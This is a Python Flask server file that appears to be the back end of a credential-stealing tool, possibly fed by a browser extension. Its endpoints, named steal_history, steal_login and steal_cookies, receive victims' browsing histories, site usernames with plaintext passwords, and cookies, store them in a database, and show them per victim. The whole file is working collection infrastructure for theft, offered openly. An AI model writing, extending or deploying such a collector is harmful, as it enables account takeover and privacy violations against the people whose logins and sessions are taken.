
from flask import Flask, render_template, request, redirect, url_for

# Initial Database Dos
import general_db

from pyfiles import users, login, secure, history, cookies

app = Flask(__name__)


@app.route("/")
def index():
    usrs = users.get_all_users()
    return render_template("index.html", users=usrs)


@app.route("/steal_history", methods=['POST'])
def steal_history():
    email = request.form['email']
    urls = request.form.getlist('urls[]')
    last_visited = request.form.getlist('last_visits[]')
    history.bulk_add_to_history(email, urls, last_visited)
    return "hi"

@app.route("/view_user/<email>", methods=['GET'])
def view_user(email):
    hist = history.get_history_by_user(email)
    return render_template('user.html', email=email, history=hist)

@app.route('/addSecure', methods=['POST'])
def add_secure():
    if request.method == 'POST':
        url = request.form['url']
        secure.addToSecure(url)
        urls = secure.getFromSecure()
        urls = map(lambda x: str(x[0]), urls)
        return render_template("index.html", urls=urls)


@app.route("/steal_login", methods=['POST'])
def steal_login():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        username = request.form['username']
        password = request.form['password']
        login.addToLogin(email, url, username, password)
        return "we all good here"


@app.route("/steal_cookies", methods=['POST'])
def steal_cookies():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        cookie = request.form['cookies']
        cookies.bulk_add_to_cookies(email, url, cookie)
        return "WHATS UP dawg?"


if __name__ == "__main__":
    # So template reloads when data is changed
    app.config['TEMPLATES_AUTO_RELOAD'] = True

    # uncomment this if you want to erase all tables
    # general_db.drop_all_tables()

    # uncomment this if you want to create all tables
    general_db.create_all_tables()

    # uncomment this time if you want to erase the data
    # general_db.delete_db()

    app.run(host='localhost', port=5000, debug=True)
